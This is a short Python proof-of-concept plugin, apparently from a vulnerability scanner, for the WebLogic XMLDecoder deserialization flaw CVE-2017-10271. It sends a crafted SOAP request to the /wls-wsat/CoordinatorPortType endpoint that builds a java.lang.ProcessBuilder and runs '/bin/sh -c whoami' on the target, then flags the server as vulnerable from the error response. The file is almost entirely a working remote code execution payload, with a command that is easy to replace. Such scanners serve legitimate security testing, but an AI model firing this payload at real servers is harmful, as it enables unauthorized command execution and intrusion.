#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: weblogic XMLdecoder反序列化漏洞(CVE-2017-10271)
referer: https://www.anquanke.com/post/id/92003
author: Lucifer
description: weblogic /wls-wsat/CoordinatorPortType接口存在命令执行。
'''

import HackRequests

def poc(arg, **kwargs):
    headers = {
        "Content-Type": "text/xml;charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/wls-wsat/CoordinatorPortType"
    post_data = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
              <soapenv:Header> 
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
                  <java> 
                    <object class="java.lang.ProcessBuilder"> 
                      <array class="java.lang.String" length="3"> 
                        <void index="0"> 
                          <string>/bin/sh</string> 
                        </void>  
                        <void index="1"> 
                          <string>-c</string> 
                        </void>  
                        <void index="2"> 
                          <string>whoami</string>
                        </void> 
                      </array>  
                      <void method="start"/> 
                    </object> 
                  </java> 
                </work:WorkContext> 
              </soapenv:Header>  
              <soapenv:Body/> 
            </soapenv:Envelope>
            '''
    vulnurl = arg + payload
    hack = HackRequests.hackRequests()
    try:
        hh = hack.http(vulnurl,post=post_data,headers=headers)
        if hh.status_code == 500 and r"java.lang.ProcessBuilder" in hh.text():
            result = {
                "name": "weblogic XMLdecoder反序列化漏洞(CVE-2017-10271)",  # 插件名称
                "content": "weblogic /wls-wsat/CoordinatorPortType接口存在命令执行。",  # 插件返回内容详情，会造成什么后果。
                "url": vulnurl,  # 漏洞存在url
                "log": hh.log,
                "tag": "code_eval"  # 漏洞标签
            }
            return result

    except:
        pass